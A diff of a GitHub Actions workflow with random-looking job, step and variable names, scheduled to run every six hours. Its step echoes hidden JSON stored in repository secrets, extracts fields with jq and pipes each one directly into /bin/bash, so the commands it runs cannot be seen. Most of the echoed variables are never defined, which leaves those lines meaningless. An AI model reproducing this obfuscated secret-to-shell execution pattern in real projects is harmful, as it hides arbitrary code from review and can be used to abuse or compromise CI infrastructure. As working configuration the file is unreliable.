@@ -1,28 +1,30 @@
 name: weiruyuan6789
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 0/6 * * *'
+    - cron: '2 3/6 * * *'
 
-jobs:  # 22252
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: weiruyuan6789
         env:
-          tb9: ${{ secrets.tb9 }}
+          w49: ${{ secrets.w49 }}
         run: |
-          echo $tb9 | jq -r .r99 | /bin/bash
-          echo $c9 | jq -r .tjy5 | /bin/bash
-          echo $qtsjg60 | jq -r .pfvkr49 | /bin/bash
-          echo $fif07514 | jq -r .zlsw88 | /bin/bash
-          echo $gqu8 | jq -r .guo1 | /bin/bash
-          echo $t67 | jq -r .eskpn96972 | /bin/bash
-          echo $ifgg072 | jq -r .rlal36 | /bin/bash
-          echo $vexo82 | jq -r .dka49255 | /bin/bash
-          echo $z2191 | jq -r .z96 | /bin/bash
-          echo $iolvx23072 | jq -r .t6529 | /bin/bash
-          echo $mi0463 | jq -r .wgkie59 | /bin/bash
+          echo $w49 | jq -r .fnlw444 | /bin/bash
+          echo $kow95990 | jq -r .bdkc57 | /bin/bash
+          echo $r50 | jq -r .zmwps2246 | /bin/bash
+          echo $al3167 | jq -r .krh89 | /bin/bash
+          echo $y36 | jq -r .xvng7 | /bin/bash
+          echo $g2 | jq -r .dizy5 | /bin/bash
+          echo $regz331 | jq -r .zssx6153 | /bin/bash
+          echo $mpkur16 | jq -r .g1 | /bin/bash
+          echo $mywnw26278 | jq -r .kdg36756 | /bin/bash
+          echo $gn87 | jq -r .t9 | /bin/bash
+          echo $vsoap6466 | jq -r .rvnqc56 | /bin/bash
+          echo $pvabg64 | jq -r .cw57594 | /bin/bash
+          echo $ptmo0908 | jq -r .nmia9 | /bin/bash
+          echo $xlnt5 | jq -r .p9 | /bin/bash
 
